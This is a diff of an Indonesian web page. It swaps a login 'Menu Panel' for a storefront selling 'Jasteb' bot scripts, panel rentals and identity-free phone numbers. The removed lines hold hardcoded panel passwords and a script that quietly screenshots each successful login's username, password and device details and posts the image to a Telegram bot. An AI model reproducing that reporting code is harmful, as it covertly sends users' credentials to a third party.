@@ -2,361 +2,210 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Menu Panel</title>
-  <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;600;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Produk Jasteb Premium</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
   <style>
-    :root {
-      --primary: #4e9af1;
-      --bg: rgba(0, 0, 0, 0.85);
-      --card: #161b22;
-      --text: #e6edf3;
-      --success: #2ecc71;
-      --danger: #e74c3c;
-    }
-
     * {
       box-sizing: border-box;
-      margin: 0;
-      padding: 0;
     }
-
-    html, body {
-      height: 100%;
-      font-family: 'Urbanist', sans-serif;
-      color: var(--text);
-      overflow: hidden;
-    }
-
     body {
-      background: var(--bg);
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+      color: #fff;
     }
-
-    #matrixCanvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: -1;
-      background: black;
+    header {
+      text-align: center;
+      padding: 40px 20px 20px;
+      font-size: 32px;
+      font-weight: 800;
+      background: linear-gradient(90deg, #00d4ff, #0088ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
-
-    main {
+    .menu-scroll {
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 60px 20px;
-      min-height: 100vh;
-      overflow-y: auto;
+      overflow-x: auto;
+      padding: 10px 20px 20px;
+      gap: 12px;
+      justify-content: center;
+      flex-wrap: wrap;
+      scrollbar-width: none;
     }
-
-    h1 {
-      font-size: 2.7em;
-      margin-bottom: 40px;
-      color: var(--primary);
-      font-weight: 700;
-      text-shadow: 0 0 12px var(--primary);
+    .menu-scroll::-webkit-scrollbar {
+      display: none;
     }
-
-    #menuContainer {
+    .menu-btn {
+      background: #1c1c1c;
+      border: 1px solid #2a2a2a;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 999px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .menu-btn:hover,
+    .menu-btn.active {
+      background: #00d4ff;
+      color: #000;
+      font-weight: 600;
+      box-shadow: 0 0 12px #00d4ff;
+    }
+    .products {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 30px;
-      width: 100%;
-      max-width: 960px;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 24px;
+      padding: 40px 30px;
+      max-width: 1300px;
+      margin: auto;
     }
-
-    .panel-button {
-      background: var(--card);
-      border: 1px solid transparent;
+    .product-card {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
       padding: 20px;
-      font-size: 1.1rem;
-      font-weight: 600;
-      color: var(--text);
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2), 0 0 0 transparent;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(0, 212, 255, 0.08);
       transition: all 0.3s ease;
-      cursor: pointer;
-      text-align: center;
+      position: relative;
     }
-
-    .panel-button:hover {
-      background-color: #1f2937;
-      box-shadow: 0 0 20px rgba(78, 154, 241, 0.3), 0 0 10px var(--primary);
-      transform: translateY(-6px) scale(1.02);
-      border-color: var(--primary);
+    .product-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 25px #00d4ff;
     }
-
-    .overlay, .login-form {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
+    .product-title {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 6px;
     }
-
-    .overlay {
-      background: rgba(0, 0, 0, 0.6);
-      z-index: 1000;
-      display: none;
-    }
-
-    .login-form {
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 1001;
-    }
-
-    .login-box {
-      background: var(--card);
-      padding: 30px;
-      border-radius: 16px;
-      width: 320px;
-      text-align: center;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
-    }
-
-    .login-box h3 {
-      margin-bottom: 20px;
-      font-size: 1.3em;
-      color: var(--primary);
-    }
-
-    input[type="text"], input[type="password"] {
-      width: 90%;
-      padding: 12px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 10px;
-      background: #21262d;
-      color: white;
-      font-size: 1rem;
-    }
-
-    .login-box button {
-      margin: 10px 6px;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 10px;
+    .product-price {
+      font-size: 20px;
+      color: #00d4ff;
       font-weight: 600;
-      font-size: 0.95rem;
-      cursor: pointer;
+      margin-bottom: 10px;
     }
-
-    .login-box button:first-child {
-      background-color: var(--success);
-      color: white;
+    .product-desc {
+      font-size: 14px;
+      color: #bbb;
+      margin-bottom: 18px;
+      min-height: 50px;
     }
-
-    .login-box button:last-child {
-      background-color: var(--danger);
-      color: white;
-    }
-
-    #notif {
-      position: fixed;
-      bottom: 25px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: #2a2d3c;
-      color: #fff;
-      padding: 14px 24px;
-      border-radius: 12px;
-      display: none;
-      z-index: 1002;
-      font-size: 0.95rem;
-    }
-
-    #successAnimation {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.85);
-      z-index: 2000;
-      display: none;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .success-box {
-      text-align: center;
-    }
-
-    .checkmark {
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      border: 6px solid var(--success);
-      border-left-color: transparent;
-      animation: rotate 1s linear forwards;
-      margin: 0 auto 20px;
-    }
-
-    .success-box p {
-      font-size: 1.5rem;
-      color: var(--success);
+    .buy-btn {
+      width: 100%;
+      padding: 12px;
+      background: #00d4ff;
+      border: none;
+      border-radius: 25px;
       font-weight: bold;
+      color: #000;
+      cursor: pointer;
+      transition: 0.3s;
+      font-size: 14px;
+    }
+    .buy-btn:hover {
+      background: #00b4cc;
+      box-shadow: 0 0 10px #00d4ff;
     }
 
-    @keyframes rotate {
-      0% { transform: rotate(0); }
-      100% { transform: rotate(360deg); }
+    @media (max-width: 600px) {
+      header {
+        font-size: 24px;
+      }
     }
   </style>
 </head>
 <body>
-  <canvas id="matrixCanvas"></canvas>
-  <main>
-    <h1>Menu Panel</h1>
-    <div id="menuContainer"></div>
-  </main>
+  <header>Produk Jasteb - Tampil Futuristik</header>
+  <div class="menu-scroll" id="menuNav"></div>
+  <div class="products" id="productContainer"></div>
 
-  <div class="overlay" id="overlay"></div>
-  <div class="login-form" id="loginForm">
-    <div class="login-box">
-      <h3 id="panelTitle">Login</h3>
-      <input type="text" id="username" placeholder="Username"><br>
-      <input type="password" id="password" placeholder="Password"><br>
-      <button onclick="submitLogin()">Masuk</button>
-      <button onclick="closeForm()">Batal</button>
-    </div>
-  </div>
-
-  <div id="notif"></div>
-  <div id="captureArea" style="display:none;">
-    <div id="reportText"></div>
-  </div>
-
-  <div id="successAnimation">
-    <div class="success-box">
-      <div class="checkmark"></div>
-      <p>Berhasil Masuk</p>
-    </div>
-  </div>
-
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
   <script>
-    // Matrix animation
-    const canvas = document.getElementById("matrixCanvas");
-    const ctx = canvas.getContext("2d");
+    AOS.init();
 
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    const katakana = "アカサタナハマヤラワ0123456789";
-    const columns = canvas.width / 14;
-    const drops = Array(Math.floor(columns)).fill(1);
-
-    function drawMatrix() {
-      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#0f0";
-      ctx.font = "14px monospace";
-
-      for (let i = 0; i < drops.length; i++) {
-        const text = katakana[Math.floor(Math.random() * katakana.length)];
-        ctx.fillText(text, i * 14, drops[i] * 14);
-
-        if (drops[i] * 14 > canvas.height || Math.random() > 0.975) {
-          drops[i] = 0;
-        }
-        drops[i]++;
-      }
-    }
-
-    setInterval(drawMatrix, 50);
-    window.onresize = () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
+    const produkKategori = {
+      "Jasteb": [
+        { title: "Jasteb Biasa", price: "Rp10.000", desc: "Jasa tebak reguler cepat dan terpercaya." },
+        { title: "Jasteb VIP", price: "Rp25.000", desc: "Akses prioritas dengan analisa khusus." }
+      ],
+      "Uncheck": [
+        { title: "Uncheck Tools", price: "Rp15.000", desc: "Alat bantu untuk memfilter data tidak aktif." }
+      ],
+      "Script Bot": [
+        { title: "Script Bot Auto Tebak", price: "Rp50.000", desc: "Script otomatis untuk event tebak-tebakan." }
+      ],
+      "Sewa Bot": [
+        { title: "Bot Event Harian", price: "Rp20.000/hari", desc: "Bot siap pakai untuk event." }
+      ],
+      "Jadi Bot": [
+        { title: "Convert Jadi Bot", price: "Rp50.000", desc: "Ubah akun biasa jadi bot dengan fitur lengkap." }
+      ],
+      "Panel Pterodactyl": [
+        { title: "Sewa Panel Ptero", price: "Rp30.000/bln", desc: "Panel hosting game/server pribadi." }
+      ],
+      "Sewa Panel Jasteb": [
+        { title: "Panel Tebak Siap Pakai", price: "Rp50.000/bln", desc: "Sudah lengkap tinggal pakai." }
+      ],
+      "Team Ress": [
+        { title: "Join Team Ress", price: "Rp100.000", desc: "Akses ke tim pengembang dan reseller." }
+      ],
+      "Admin Team Ress": [
+        { title: "Upgrade ke Admin", price: "Rp250.000", desc: "Dapat kontrol penuh team & akses bot." }
+      ],
+      "PT Jasteb": [
+        { title: "Lisensi PT Jasteb", price: "Rp500.000", desc: "Nama resmi dan branding PT kamu." }
+      ],
+      "Nomor Kosong": [
+        { title: "Nomor Kosong Random", price: "Rp5.000", desc: "Nomor tanpa identitas untuk berbagai keperluan." }
+      ],
+      "Jasa Buat Web Payment": [
+        { title: "Web QRIS Payment", price: "Rp150.000", desc: "Website siap pakai dengan sistem QRIS." },
+        { title: "Web PPOB Modern", price: "Rp200.000", desc: "Web pembayaran digital & produk digital." }
+      ]
     };
-  </script>
 
-  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-  <script>
-    const telegramToken = "YOUR_BOT_TOKEN";
-    const chatId = "YOUR_CHAT_ID";
+    const menuNav = document.getElementById("menuNav");
+    const productContainer = document.getElementById("productContainer");
 
-    const panels = [
-      { name: "PRIBADIFAAN", user: "faan", pass: "OCTA", url: "https://example.com/pribadifaan" },
-      { name: "PT JASTEB 1", user: "admin", pass: "111", url: "https://example.com/jasteb" },
-      { name: "ZaanHost", user: "zan", pass: "zan", url: "https://example.com/zaanhost" },
-      { name: "PRIBADI FAAN", user: "faantek", pass: "faantek", url: "https://example.com/faantek" },
-      { name: "KOSONG", user: "test", pass: "123", url: "https://example.com/kosong" }
-    ];
-
-    let selectedPanel = null;
-
-    function renderButtons() {
-      const container = document.getElementById("menuContainer");
-      panels.forEach(panel => {
+    function generateMenu() {
+      Object.keys(produkKategori).forEach((kategori, index) => {
         const btn = document.createElement("button");
-        btn.className = "panel-button";
-        btn.textContent = panel.name;
-        btn.onclick = () => {
-          selectedPanel = panel;
-          document.getElementById("panelTitle").textContent = "Login - " + panel.name;
-          document.getElementById("username").value = "";
-          document.getElementById("password").value = "";
-          document.getElementById("overlay").style.display = "block";
-          document.getElementById("loginForm").style.display = "flex";
-        };
-        container.appendChild(btn);
+        btn.innerText = kategori;
+        btn.className = "menu-btn";
+        btn.onclick = () => showProduk(kategori, btn);
+        if (index === 0) btn.classList.add("active");
+        menuNav.appendChild(btn);
       });
     }
 
-    function closeForm() {
-      document.getElementById("overlay").style.display = "none";
-      document.getElementById("loginForm").style.display = "none";
-    }
-
-    function showNotif(message, color = "#444") {
-      const notif = document.getElementById("notif");
-      notif.style.background = color;
-      notif.textContent = message;
-      notif.style.display = "block";
-      setTimeout(() => notif.style.display = "none", 3000);
-    }
-
-    function submitLogin() {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      if (!selectedPanel) return;
-
-      if (username === selectedPanel.user && password === selectedPanel.pass) {
-        showNotif("Login berhasil", "#2ecc71");
-        const reportHTML = `
-          <b>Panel:</b> ${selectedPanel.name}<br>
-          <b>Username:</b> ${username}<br>
-          <b>Password:</b> ${password}<br>
-          <b>Waktu:</b> ${new Date().toLocaleString()}<br>
-          <b>Device:</b> ${navigator.userAgent}
+    function showProduk(kategori, clickedBtn) {
+      productContainer.innerHTML = "";
+      produkKategori[kategori].forEach(p => {
+        const pesan = encodeURIComponent(`Halo, saya tertarik beli *${p.title}* seharga ${p.price}`);
+        productContainer.innerHTML += `
+          <div class="product-card" data-aos="fade-up">
+            <div class="product-title">${p.title}</div>
+            <div class="product-price">${p.price}</div>
+            <div class="product-desc">${p.desc}</div>
+            <a href="https://wa.me/6281234567890?text=${pesan}" target="_blank">
+              <button class="buy-btn">Beli Sekarang</button>
+            </a>
+          </div>
         `;
-        document.getElementById("reportText").innerHTML = reportHTML;
-        html2canvas(document.getElementById("captureArea")).then(canvas => {
-          sendImageToTelegram(canvas);
-          document.getElementById("overlay").style.display = "none";
-          document.getElementById("loginForm").style.display = "none";
-          document.getElementById("successAnimation").style.display = "flex";
-          setTimeout(() => {
-            window.location.href = selectedPanel.url;
-          }, 2500);
-        });
-      } else {
-        showNotif("Username atau password salah!", "#e74c3c");
-      }
-    }
-
-    function sendImageToTelegram(canvas) {
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "login.png");
-        fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
       });
+
+      document.querySelectorAll(".menu-btn").forEach(btn => btn.classList.remove("active"));
+      clickedBtn.classList.add("active");
     }
 
-    window.onload = renderButtons;
+    window.onload = () => {
+      generateMenu();
+      const firstCategory = Object.keys(produkKategori)[0];
+      showProduk(firstCategory, document.querySelector(".menu-btn"));
+    };
   </script>
 </body>
 </html>
